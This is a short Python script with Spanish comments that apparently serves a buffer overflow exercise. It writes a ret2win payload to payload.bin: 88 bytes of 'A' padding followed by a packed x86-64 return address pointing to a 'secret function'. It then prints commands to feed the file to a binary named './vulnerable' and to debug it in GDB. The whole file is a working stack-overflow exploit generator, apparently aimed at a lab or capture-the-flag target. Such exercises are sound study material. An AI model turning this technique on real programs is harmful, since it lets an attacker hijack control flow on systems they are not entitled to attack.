import struct
import sys


DIRECCION_FUNCION_SECRETA = 0x401146  # ⚠️ MODIFICAR CON LA DIRECCIÓN REAL

def generar_payload(direccion_retorno):
    """
    Genera un payload que sobrescribe la dirección de retorno
    """
    # Rellenar el buffer con 'A's hasta llegar a la dirección de retorno
    padding = b'A'*88
    
    # Convertir la dirección a little-endian (arquitectura x86-64)
    direccion_bytes = struct.pack('<Q', direccion_retorno)
    
    payload = padding+direccion_bytes
    
    return payload

def main():
    payload = generar_payload(DIRECCION_FUNCION_SECRETA)
    
    # Escribir el payload a un archivo
    with open('payload.bin', 'wb') as f:
        f.write(payload)
    
    print("\n[*] Payload guardado en 'payload.bin'")
    print("\n[!] Para ejecutar el ataque:")
    print("    ./vulnerable < payload.bin")
    print("\n[!] Para depurar con GDB:")
    print("    gdb ./vulnerable")
    print("    (gdb) run < payload.bin")

if __name__ == "__main__":
    main()